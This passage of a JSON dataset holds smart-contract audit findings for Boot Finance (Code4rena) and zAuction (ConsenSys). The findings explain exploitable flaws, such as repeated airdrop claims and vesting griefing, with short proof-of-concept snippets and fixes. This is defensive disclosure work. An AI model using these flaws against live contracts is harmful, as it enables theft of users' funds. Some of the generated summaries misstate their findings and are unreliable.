      "summary": "\nThis bug report is about an issue with the Vesting.sol contract, which is part of the 2021-11-bootfinance repository on GitHub. The issue is that the timelocks for any beneficiary can be vested by someone who is not the beneficiary. This means that a malicious actor can repeatedly call the `vest()` function with minute amounts to make the array large enough, such that when it comes to claiming, it will exceed the gas limit and revert, rendering the vestment for the beneficiary unclaimable. This could be done to each beneficiary, locking up all the vestments.\n\nThe bug was discovered through manual code review, and the proof of concept can be found in the links provided in the report. The recommended mitigation steps are to create a minimum on the vestment amounts, such that it won't be feasible for a malicious actor to create a large amount of vestments, and to restrict the vestment contribution of a beneficiary with `require(beneficiary == msg.sender)`.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/120",
      "tags": [],
      "finders": [
        "WatchPug",
        "leastwood",
        "nathaniel",
        "pauliax"
      ]
    },
    {
      "id": "966",
      "title": "[H-07] customPrecisionMultipliers would be rounded to zero and break the pool",
      "impact": "HIGH",
      "content": "## Handle\n\njonah1005\n\n\n## Vulnerability details\n\n## Impact\nCustomPrecisionMultipliers are set in the constructor:\n```solidity\n        customPrecisionMultipliers[0] = targetPriceStorage.originalPrecisionMultipliers[0].mul(_targetPrice).div(10 ** 18);\n```\n`originalPrecisionMultipliers` equal to 1 if the token's decimal = 18. The targe price could only be an integer.\n\nIf the target price is bigger than 10**18, the user can deposit and trade in the pool. Though, the functionality would be far from the spec.\n\nIf the target price is set to be smaller than 10**18, the pool would be broken and all funds would be stuck.\n\nI consider this is a high-risk issue.\n\n\n## Proof of Concept\nPlease refer to the implementation.\n[Swap.sol#L184-L187](https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/Swap.sol#L184-L187)\n\nWe can also trigger the bug by setting a pool with target price = 0.5. (0.5 * 10**18)\n## Tools Used\nNone\n## Recommended Mitigation Steps\nI recommend providing extra 10**18 in both multipliers.\n```solidity\n        customPrecisionMultipliers[0] = targetPriceStorage.originalPrecisionMultipliers[0].mul(_targetPrice).mul(10**18).div(10 ** 18);\n        customPrecisionMultipliers[1] = targetPriceStorage.originalPrecisionMultipliers[1].mul(10**18);\n```\nThe customswap only supports two tokens in a pool, there's should be enough space. Recommend the devs to go through the trade-off saddle finance has paid to support multiple tokens. The code could be more clean and efficient if the pools' not support multiple tokens.",
      "summary": "\nA bug was reported in the Swap.sol file of the 2021-11-bootfinance repository. The CustomPrecisionMultipliers were set in the constructor, and the originalPrecisionMultipliers were equal to 1 if the token's decimal = 18. If the target price is bigger than 10**18, the user can deposit and trade in the pool, but the functionality would be far from the spec. If the target price is set to be smaller than 10**18, the pool would be broken and all funds would be stuck. This bug is considered a high risk issue. To trigger the bug, the target price can be set to 0.5 (0.5 * 10**18). To fix the bug, the dev suggested providing extra 10**18 in both multipliers. They also recommended the devs to go through the trade-off saddle finance has paid to support multiple tokens, as the code could be more clean and efficient if the pools do not support multiple tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/183",
      "tags": [],
      "finders": [
        "jonah1005"
      ]
    },
    {
      "id": "965",
      "title": "[H-06] Ideal balance is not calculated correctly when providing imbalanced liquidity",
      "impact": "HIGH",
      "content": "_Submitted by jonah1005_\n\n#### Impact\n\nWhen a user provides imbalanced liquidity, the fee is calculated according to the ideal balance. In saddle finance, the optimal balance should be the same ratio as in the Pool.\n\nTake, for example, if there's 10000 USD and 10000 DAI in the saddle's USD/DAI pool, the user should get the optimal lp if he provides lp with ratio = 1.\n\nHowever, if the `customSwap` pool is created with a target price = 2. The user would get 2 times more lp if he deposits DAI.\n[SwapUtils.sol#L1227-L1245](https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/SwapUtils.sol#L1227-L1245)\nThe current implementation does not calculates ideal balance correctly.\n\nIf the target price is set to be 10, the ideal balance deviates by 10.\nThe fee deviates a lot. I consider this is a high-risk issues.\n\n#### Proof of Concept\n\nWe can observe the issue if we initiates two pools DAI/LINK pool and set the target price to be 4.\n\nFor the first pool, we deposit more DAI.\n\n```python\n    swap = deploy_contract('Swap' \n        [dai.address, link.address], [18, 18], 'lp', 'lp', 1, 85, 10**7, 0, 0, 4* 10**18)\n    link.functions.approve(swap.address, deposit_amount).transact()\n    dai.functions.approve(swap.address, deposit_amount).transact()\n    previous_lp = lptoken.functions.balanceOf(user).call()\n    swap.functions.addLiquidity([deposit_amount, deposit_amount // 10], 10, 10**18).transact()\n    post_lp = lptoken.functions.balanceOf(user).call()\n    print('get lp', post_lp - previous_lp)\n```\n\nFor the second pool, one we deposit more DAI.\n\n```python\n    swap = deploy_contract('Swap' \n        [dai.address, link.address], [18, 18], 'lp', 'lp', 1, 85, 10**7, 0, 0, 4* 10**18)\n    link.functions.approve(swap.address, deposit_amount).transact()\n    dai.functions.approve(swap.address, deposit_amount).transact()\n    previous_lp = lptoken.functions.balanceOf(user).call()\n    swap.functions.addLiquidity([deposit_amount, deposit_amount // 10], 10, 10**18).transact()\n    post_lp = lptoken.functions.balanceOf(user).call()\n    print('get lp', post_lp - previous_lp)\n```\n\nWe can get roughly 4x more lp in the first case\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nThe current implementation uses `self.balances`\n\n<https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/SwapUtils.sol#L1231-L1236>\n\n```js\nfor (uint256 i = 0; i < self.pooledTokens.length; i++) {\n    uint256 idealBalance = v.d1.mul(self.balances[i]).div(v.d0);\n    fees[i] = feePerToken\n        .mul(idealBalance.difference(newBalances[i]))\n        .div(FEE_DENOMINATOR);\n    self.balances[i] = newBalances[i].sub(\n        fees[i].mul(self.adminFee).div(FEE_DENOMINATOR)\n    );\n    newBalances[i] = newBalances[i].sub(fees[i]);\n}\n```\n\nReplaces `self.balances` with `_xp(self, newBalances)` would be a simple fix.\nI consider the team can take balance's weighted pool as a reference. [WeightedMath.sol#L149-L179](https://github.com/balancer-labs/balancer-v2-monorepo/blob/7ff72a23bae6ce0eb5b134953cc7d5b79a19d099/pkg/pool-weighted/contracts/WeightedMath.sol#L149-L179)\n\n**[chickenpie347 (Boot Finance) confirmed](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/150)**\n\n",
      "summary": "\nA bug has been reported in Saddle Finance, where the fees are calculated according to the ideal balance when a user provides imbalanced liquidity. This is an issue as the optimal balance should be the same ratio as in the Pool. For example, if there is 10000 USD and 10000 DAI in the saddle's USD/DAI pool, the user should get the optimal lp if he provides lp with a ratio of 1. However, if the customSwap pool is created with a target price of 2, the user would get 2 times more lp if he deposits DAI. This issue can be observed if two pools, DAI/LINK pool, are initiated and the target price is set to be 4. The user would get 4 times more lp if he deposits more DAI.\n\nThe bug can be fixed by replacing the `self.balances` with `_xp(self, newBalances)` in the code. The team can also take the balance's weighted pool as a reference. This would help in calculating the ideal balance correctly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/150",
      "tags": [],
      "finders": [
        "jonah1005"
      ]
    },
    {
      "id": "964",
      "title": "[H-05] Claim airdrop repeatedly",
      "impact": "HIGH",
      "content": "_Submitted by gpersoon, also found by elprofesor, fr0zn, and pauliax_\n\n#### Impact\n\nSuppose someone claims the last part of his airdrop via `claimExact()` of `AirdropDistribution.sol`\nThen `airdrop\\[msg.sender].amount` will be set to 0.\n\nSuppose you then call validate() again.\nThe check `airdrop\\[msg.sender].amount == 0` will allow you to continue, because amount has just be set to 0.\nIn the next part of the function, `airdrop\\[msg.sender]` is overwritten with fresh values and `airdrop\\[msg.sender]`.claimed will be reset to 0.\n\nNow you can claim your airdrop again (as long as there are tokens present in the contract)\n\nNote: The function `claim()` prevents this from happening via `assert(airdrop\\[msg.sender].amount - claimable != 0);`, which has its own problems, see other reported issues.\n\n#### Proof of Concept\n\n// <https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/AirdropDistribution.sol#L555-L563>\n\n```solidity\nfunction claimExact(uint256 \\_value) external nonReentrant {\nrequire(msg.sender != address(0));\nrequire(airdrop\\[msg.sender].amount != 0);`\n\n    uint256 avail = _available_supply();\n    uint256 claimable = avail * airdrop[msg.sender].fraction / 10**18; //\n    if (airdrop[msg.sender].claimed != 0){\n        claimable -= airdrop[msg.sender].claimed;\n    }\n\n    require(airdrop[msg.sender].amount >= claimable); // amount can be equal to claimable\n    require(_value <= claimable);                       // _value can be equal to claimable\n    airdrop[msg.sender].amount -= _value;      // amount will be set to 0 with the last claim\n```\n// <https://github.com/code-423n4/2021-11-bootfinance/blob/7c457b2b5ba6b2c887dafdf7428fd577e405d652/vesting/contracts/AirdropDistribution.sol#L504-L517>\n```solidity\nfunction validate() external nonReentrant {\n...\nrequire(airdrop\\[msg.sender].amount == 0, \"Already validated.\");\n...\nAirdrop memory newAirdrop = Airdrop(airdroppable, 0, airdroppable, 10\\*\\*18 \\* airdroppable / airdrop_supply);\nairdrop\\[msg.sender] = newAirdrop;\nvalidated\\[msg.sender] = 1;   // this is set, but isn't checked on entry of this function\n```\n\n#### Recommended Mitigation Steps\n\nAdd the following to `validate() :\nrequire(validated\\[msg.sender]== 0, \"Already validated.\");`\n\n**[chickenpie347 (Boot Finance) confirmed and resolved](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/129#issuecomment-964720927):**\n > Addressed in issue #101 \n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the AirdropDistribution.sol smart contract. The vulnerability allows someone to claim the last part of their airdrop multiple times. This is because the amount is set to 0 after the last claim, and then the airdrop[msg.sender] is overwritten with fresh values and airdrop[msg.sender].claimed is reset to 0. This allows the user to claim their airdrop again as long as there are tokens present in the contract. \n\nThe proof of concept provided in the report shows the two parts of the code that are relevant to the vulnerability. The first is the claimExact() function, which sets the amount to 0 after the last claim. The second is the validate() function, which does not check if the airdrop has already been validated. \n\nThe recommended mitigation step is to add a check to the validate() function to ensure that the airdrop has not already been validated. This will prevent the user from claiming the airdrop multiple times.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/129",
      "tags": [],
      "finders": [
        "elprofesor",
        "fr0zn",
        "gpersoon",
        "pauliax"
      ]
    },
    {
      "id": "963",
      "title": "[H-04] Swaps are not split when trade crosses target price",
      "impact": "HIGH",
      "content": "_Submitted by cmichel, also found by gzeon_\n\nThe protocol uses two amplifier values A1 and A2 for the swap, depending on the target price, see `SwapUtils.determineA`.\nThe swap curve is therefore a join of two different curves at the target price.\nWhen doing a trade that crosses the target price, it should first perform the trade partially with A1 up to the target price, and then the rest of the trade order with A2.\n\nHowever, the `SwapUtils.swap / _calculateSwap` function does not do this, it only uses the \"new A\", see `getYC` step 5.\n\n```solidity\n// 5. Check if we switched A's during the swap\nif (aNew == a){     // We have used the correct A\n    return y;\n} else {    // We have switched A's, do it again with the new A\n    return getY(self, tokenIndexFrom, tokenIndexTo, x, xp, aNew, d);\n}\n```\n\n#### Impact\n\nTrades that cross the target price and would lead to a new amplifier being used are not split up and use the new amplifier for the *entire trade*.\nThis can lead to a worse (better) average execution price than manually splitting the trade into two transactions, first up to but below the target price, and a second one with the rest of the trader order size, using both A1 and A2 values.\n\nIn the worst case, it could even be possible to make the entire trade with one amplifier and then sell the swap result again using the other amplifier making a profit.\n\n#### Recommended Mitigation Steps\n\nTrades that lead to a change in amplifier value need to be split up into two trades using both amplifiers to correctly calculate the swap result.\n\n**[chickenpie347 (Boot Finance) confirmed](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/216)**\n\n",
      "summary": "\nA bug has been reported in the protocol of a software. The protocol uses two amplifier values A1 and A2 for the swap, depending on the target price. The bug is that when doing a trade that crosses the target price, it should first perform the trade partially with A1 up to the target price, and then the rest of the trade order with A2. However, the function does not do this, it only uses the \"new A\" which can lead to a worse (better) average execution price than manually splitting the trade into two transactions, first up to but below the target price, and a second one with the rest of the trader order size, using both A1 and A2 values. In the worst case, it could even be possible to make the entire trade with one amplifier and then sell the swap result again using the other amplifier making a profit. To fix this, trades that lead to a change in amplifier value need to be split up into two trades using both amplifiers to correctly calculate the swap result.",
      "quality_score": 2,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/216",
      "tags": [
        "Business Logic",
        "Swap"
      ],
      "finders": [
        "cmichel",
        "gzeon"
      ]
    },
    {
      "id": "962",
      "title": "[H-03] SwapUtils.sol Wrong implementation",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nBased on the context, the `tokenPrecisionMultipliers` used in price calculation should be calculated in realtime based on `initialTargetPrice`, `futureTargetPrice`, `futureTargetPriceTime` and current time, just like `getA()` and `getA2()`.\n\nHowever, in the current implementation, `tokenPrecisionMultipliers` used in price calculation is the stored value, it will only be changed when the owner called `rampTargetPrice()` and `stopRampTargetPrice()`.\n\nAs a result, the `targetPrice` set by the owner will not be effective until another `targetPrice` is being set or `stopRampTargetPrice()` is called.\n\n### Recommendation\n\nConsider adding `Swap.targetPrice` and changing the `_xp()` at L661 from:\n\nhttps://github.com/code-423n4/2021-11-bootfinance/blob/f102ee73eb320532c5a7c1e833f225c479577e39/customswap/contracts/SwapUtils.sol#L661-L667\n\n```solidity=661\nfunction _xp(Swap storage self, uint256[] memory balances)\n    internal\n    view\n    returns (uint256[] memory)\n{\n    return _xp(balances, self.tokenPrecisionMultipliers);\n}\n```\n\nTo:\n\n```solidity=661\nfunction _xp(Swap storage self, uint256[] memory balances)\n    internal\n    view\n    returns (uint256[] memory)\n{\n    uint256[2] memory tokenPrecisionMultipliers = self.tokenPrecisionMultipliers;\n    tokenPrecisionMultipliers[0] = self.targetPrice.originalPrecisionMultipliers[0].mul(_getTargetPricePrecise(self)).div(WEI_UNIT)\n    return _xp(balances, tokenPrecisionMultipliers);\n}\n```",
      "summary": "\nThis bug report is about the WatchPug vulnerability. It states that the `tokenPrecisionMultipliers` used in price calculation should be calculated in realtime based on `initialTargetPrice`, `futureTargetPrice`, `futureTargetPriceTime` and current time, just like `getA()` and `getA2()`. However, the current implementation is using a stored value, and it will only be changed when the owner calls `rampTargetPrice()` and `stopRampTargetPrice()`. As a result, the `targetPrice` set by the owner will not be effective until another `targetPrice` is set or `stopRampTargetPrice()` is called.\n\nThe recommendation is to consider adding `Swap.targetPrice` and changing the `_xp()` at L661. This will allow the `tokenPrecisionMultipliers` to be calculated in realtime, ensuring the `targetPrice` set by the owner is effective.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/252",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "961",
      "title": "[H-02] Can not update target price",
      "impact": "HIGH",
      "content": "_Submitted by jonah1005, also found by WatchPug_\n\n#### Impact\n\nThe sanity checks in `rampTargetPrice` are broken\n[SwapUtils.sol#L1571-L1581](https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/SwapUtils.sol#L1571-L1581)\n\n```solidity\n        if (futureTargetPricePrecise < initialTargetPricePrecise) {\n            require(\n                futureTargetPricePrecise.mul(MAX_RELATIVE_PRICE_CHANGE).div(WEI_UNIT) >= initialTargetPricePrecise,\n                \"futureTargetPrice_ is too small\"\n            );\n        } else {\n            require(\n                futureTargetPricePrecise <= initialTargetPricePrecise.mul(MAX_RELATIVE_PRICE_CHANGE).div(WEI_UNIT),\n                \"futureTargetPrice_ is too large\"\n            );\n        }\n```\n\nIf `futureTargetPricePrecise` is smaller than `initialTargetPricePrecise` 0.01 of `futureTargetPricePrecise` would never larger than `initialTargetPricePrecise`.\n\nAdmin would not be able to ramp the target price. As it's one of the most important features of the customswap, I consider this is a high-risk issue\n\n#### Proof of Concept\n\nHere's a web3.py script to demo that it's not possible to change the target price even by 1 wei.\n\n```python\n    p1, p2, _, _ =swap.functions.targetPriceStorage().call()\n    future = w3.eth.getBlock(w3.eth.block_number)['timestamp'] + 200 * 24 * 3600\n\n    # futureTargetPrice_ is too small\n    swap.functions.rampTargetPrice(p1 -1, future).transact()\n    # futureTargetPrice_ is too large\n    swap.functions.rampTargetPrice(p1 + 1, future).transact()\n```\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nWould it be something like:\n\n```solidity\n        if (futureTargetPricePrecise < initialTargetPricePrecise) {\n            require(\n                futureTargetPricePrecise.mul(MAX_RELATIVE_PRICE_CHANGE + WEI_UNIT).div(WEI_UNIT) >= initialTargetPricePrecise,\n                \"futureTargetPrice_ is too small\"\n            );\n        } else {\n            require(\n                futureTargetPricePrecise <= initialTargetPricePrecise.mul(MAX_RELATIVE_PRICE_CHANGE + WEI_UNIT).div(WEI_UNIT),\n                \"futureTargetPrice_ is too large\"\n            );\n        }\n```\n\nI believe the dev would spot this mistake if there's a more relaxed timeline.\n\n**[chickenpie347 (Boot Finance) confirmed](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/143)** \n\n",
      "summary": "\nA bug has been reported in the SwapUtils.sol code of the 2021-11-bootfinance project. The sanity checks in rampTargetPrice are broken, which can prevent the admin from ramping the target price. This is a high-risk issue as it is one of the most important features of the customswap. To demonstrate the issue, a web3.py script was written to show that it is not possible to change the target price even by 1 wei. To fix the issue, the dev should look into making the timeline more relaxed so that the mistake can be spotted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/143",
      "tags": [],
      "finders": [
        "WatchPug",
        "jonah1005"
      ]
    },
    {
      "id": "960",
      "title": "[H-01] Contract BasicSale is missing an approve(address(vestLock), 2**256-1) call",
      "impact": "HIGH",
      "content": "_Submitted by Reigada, also found by WatchPug_\n\n#### Impact\n\nAs we can see in the contracts `AirdropDistribution` and `InvestorDistribution`, they both have the following `approve() call: mainToken.approve(address(vestLock), 2\\*\\*256-1);`\n- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/AirdropDistribution.sol#L499>\n- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L80>\n\nThis is necessary because both contracts transfer tokens to the vesting contract by calling its `vest()` function:\n- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/AirdropDistribution.sol#L544>\n- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/AirdropDistribution.sol#L569>\n- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L134>\n- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L158>\n\nThe code of the `vest()` function in the Vesting contract performs a transfer from `msg.sender` to Vesting contract address -> `vestingToken.transferFrom(msg.sender, address(this), \\_amount);`\n<https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L95>\n\nSame is done in the BasicSale contract:\n<https://github.com/code-423n4/2021-11-bootfinance/blob/main/tge/contracts/PublicSale.sol#L225>\n\nThe problem is that this contract is missing the `approve()` call. For that reason, the contract is totally useless as the function `\\_withdrawShare()` will always revert with the following message:\nrevert reason: ERC20: transfer amount exceeds allowance. This means that all the `mainToken` sent to the contract would be stuck there forever. No way to retrieve them.\n\nHow this issue was not detected in the testing phase?\nVery simple. The mock used by the team has an empty `vest()` function that performs no transfer call.\n<https://github.com/code-423n4/2021-11-bootfinance/blob/main/tge/contracts/helper/MockVesting.sol#L10>\n\n#### Proof of Concept\n\nSee below Brownie's custom output:\n```\nCalling -> publicsale.withdrawShare(1, 1, {'from': user2})\nTransaction sent: 0x9976e4f48bd14f9be8e3e0f4d80fdb8f660afab96a7cbd64fa252510154e7fde\nGas price: 0.0 gwei   Gas limit: 6721975   Nonce: 5\nBasicSale.withdrawShare confirmed (ERC20: transfer amount exceeds allowance)   Block: 13577532   Gas used: 323334 (4.81%)\n\nCall trace for '0x9976e4f48bd14f9be8e3e0f4d80fdb8f660afab96a7cbd64fa252510154e7fde':\nInitial call cost  \\[21344 gas]\nBasicSale.withdrawShare  0:3724  \\[16114 / -193010 gas]\n├── BasicSale.\\_withdrawShare  111:1109  \\[8643 / 63957 gas]\n│   ├── BasicSale.\\_updateEmission  116:405  \\[53294 / 55739 gas]\n│   │   └── BasicSale.getDayEmission  233:248  \\[2445 gas]\n│   ├── BasicSale.\\_processWithdrawal  437:993  \\[-7726 / -616 gas]\n│   │   ├── BasicSale.getEmissionShare  484:859  \\[4956 / 6919 gas]\n│   │   │   │\n│   │   │   └── MockERC20.balanceOf  \\[STATICCALL]  616:738  \\[1963 gas]\n│   │   │           ├── address: mockerc20.address\n│   │   │           ├── input arguments:\n│   │   │           │   └── account: publicsale.address\n│   │   │           └── return value: 100000000000000000000\n│   │   │\n│   │   └── SafeMath.sub  924:984  \\[191 gas]\n│   └── SafeMath.sub  1040:1100  \\[191 gas]\n│\n├── MockERC20.transfer  \\[CALL]  1269:1554  \\[1115 / 30109 gas]\n│   │   ├── address: mockerc20.address\n│   │   ├── value: 0\n│   │   ├── input arguments:\n│   │   │   ├── recipient: user2.address\n│   │   │   └── amount: 27272727272727272727\n│   │   └── return value: True\n│   │\n│   └── ERC20.transfer  1366:1534  \\[50 / 28994 gas]\n│       └── ERC20.\\_transfer  1374:1526  \\[28944 gas]\n└── Vesting.vest  \\[CALL]  1705:3712  \\[-330491 / -303190 gas]\n│   ├── address: vesting.address\n│   ├── value: 0\n│   ├── input arguments:\n│   │   ├── \\_beneficiary: user2.address\n│   │   ├── \\_amount: 63636363636363636363\n│   │   └── \\_isRevocable: 0\n│   └── revert reason: ERC20: transfer amount exceeds allowance <-------------\n│\n├── SafeMath.add  1855:1883  \\[94 gas]\n├── SafeMath.add  3182:3210  \\[94 gas]\n├── SafeMath.add  3236:3264  \\[94 gas]\n│\n└── MockERC20.transferFrom  \\[CALL]  3341:3700  \\[99923 / 27019 gas]\n│   ├── address: mockerc20.address\n│   ├── value: 0\n│   ├── input arguments:\n│   │   ├── sender: publicsale.address\n│   │   ├── recipient: vesting.address\n│   │   └── amount: 63636363636363636363\n│   └── revert reason: ERC20: transfer amount exceeds allowance\n│\n└── ERC20.transferFrom  3465:3700  \\[-97648 / -72904 gas]\n└── ERC20.\\_transfer  3473:3625  \\[24744 gas]\n```\n#### Tools Used\n\nManual testing\n\n#### Recommended Mitigation Steps\n\nThe following `approve()` call should be added in the constructor of the BasicSale contract:\n`mainToken.approve(address(vestLock), 2\\*\\*256-1);`\n\n**[chickenpie347 (Boot Finance) confirmed](https://github.com/code-423n4/2021-11-bootfinance-findings/issues/135)** \n\n",
      "summary": "\nThis bug report is about a vulnerability in the contracts AirdropDistribution and InvestorDistribution. The problem is that the code of the vest() function in the Vesting contract performs a transfer from msg.sender to Vesting contract address, but the contract is missing the approve() call. This means that all the mainToken sent to the contract would be stuck there forever. The mock used by the team has an empty vest() function that performs no transfer call, which is why this issue was not detected in the testing phase. \n\nThe recommended mitigation step is to add the approve() call in the constructor of the BasicSale contract: mainToken.approve(address(vestLock), 2**256-1); Manual testing was used to identify this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Boot Finance",
      "source_link": "https://code4rena.com/reports/2021-11-bootfinance",
      "github_link": "https://github.com/code-423n4/2021-11-bootfinance-findings/issues/135",
      "tags": [],
      "finders": [
        "WatchPug",
        "Reigada"
      ]
    },
    {
      "id": "13391",
      "title": "zAuction - seller should not be able to accept their own bid ✓ Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAddressed with [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec) by disallowing the seller to accept their own bid. The client provided the following note:\n\n\n\n> \n> 5.28 seller != buyer required\n> \n> \n> \n\n\n\n\n#### Description\n\n\nA seller can accept their own bid which is an ineffective action that is emitting an event.\n\n\n#### Examples\n\n\n**zAuction/contracts/zAuction.sol:L35-L56**\n\n\n\n```\nfunction acceptBid(bytes memory signature, uint256 rand, address bidder, uint256 bid, address nftaddress, uint256 tokenid) external {\n    address recoveredbidder = recover(toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftaddress, tokenid))), signature);\n    require(bidder == recoveredbidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n    IERC721 nftcontract = IERC721(nftaddress);\n    accountant.Exchange(bidder, msg.sender, bid);\n    nftcontract.transferFrom(msg.sender, bidder, tokenid);\n    emit BidAccepted(bidder, msg.sender, bid, nftaddress, tokenid);\n}\n\n/// @dev 'true' in the hash here is the eth/weth switch\nfunction acceptWethBid(bytes memory signature, uint256 rand, address bidder, uint256 bid, address nftaddress, uint256 tokenid) external {\n    address recoveredbidder = recover(toEthSignedMessageHash(keccak256(abi.encode(rand, address(this), block.chainid, bid, nftaddress, tokenid, true))), signature);\n    require(bidder == recoveredbidder, 'zAuction: incorrect bidder');\n    require(!randUsed[rand], 'Random nonce already used');\n    randUsed[rand] = true;\n    IERC721 nftcontract = IERC721(nftaddress);\n    weth.transferFrom(bidder, msg.sender, bid);\n    nftcontract.transferFrom(msg.sender, bidder, tokenid);\n    emit WethBidAccepted(bidder, msg.sender, bid, nftaddress, tokenid);\n}\n\n```\n#### Recommendation\n\n\nDisallow transfers to self.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "13390",
      "title": "zAuction - accountant allows zero value withdrawals/deposits/exchange ✓ Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nObsolete. The affected component has been removed from the system with [zer0-os/[email protected]`135b2aa`](https://github.com/zer0-os/zAuction/commit/135b2aaddcfc70775fd1916518c2cc05106621ec).\n\n\n#### Description\n\n\nZero value transfers effectively perform a no-operation sometimes followed by calling out to the recipient of the withdrawal.\n\n\nA transfer where `from==to` or where the value is `0` is ineffective.\n\n\n#### Examples\n\n\n**zAuction/contracts/zAuctionAccountant.sol:L38-L42**\n\n\n\n```\nfunction Withdraw(uint256 amount) external {\n    ethbalance[msg.sender] = SafeMath.sub(ethbalance[msg.sender], amount);\n    payable(msg.sender).transfer(amount);\n    emit Withdrew(msg.sender, amount);\n}\n\n```\n**zAuction/contracts/zAuctionAccountant.sol:L33-L36**\n\n\n\n```\nfunction Deposit() external payable {\n    ethbalance[msg.sender] = SafeMath.add(ethbalance[msg.sender], msg.value);\n    emit Deposited(msg.sender, msg.value);\n}\n\n```\n**zAuction/contracts/zAuctionAccountant.sol:L44-L58**\n\n\n\n```\n    function zDeposit(address to) external payable onlyZauction {\n        ethbalance[to] = SafeMath.add(ethbalance[to], msg.value);\n        emit zDeposited(to, msg.value);\n    }\n\n    function zWithdraw(address from, uint256 amount) external onlyZauction {\n        ethbalance[from] = SafeMath.sub(ethbalance[from], amount);\n        emit zWithdrew(from, amount);\n    }\n\n    function Exchange(address from, address to, uint256 amount) external onlyZauction {\n        ethbalance[from] = SafeMath.sub(ethbalance[from], amount);\n        ethbalance[to] = SafeMath.add(ethbalance[to], amount);\n        emit zExchanged(from, to, amount);\n    }\n\n```\n#### Recommendation\n\n\nConsider rejecting ineffective withdrawals (zero value) or at least avoid issuing a zero value `ETH` transfers. Avoid emitting successful events for ineffective calls to not trigger 3rd party components on noop’s.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Zer0 - zAuction",
      "source_link": "https://consensys.net/diligence/audits/2021/05/zer0-zauction/",
      "github_link": "",
      "tags": [],
      "finders": [
        "David Oz Kashi",
        "Martin Ortner"
      ]
    },
    {
      "id": "13389",
      "title": "zAuction - hardcoded ropsten token address ✓ Fixed",
      "impact": "LOW",
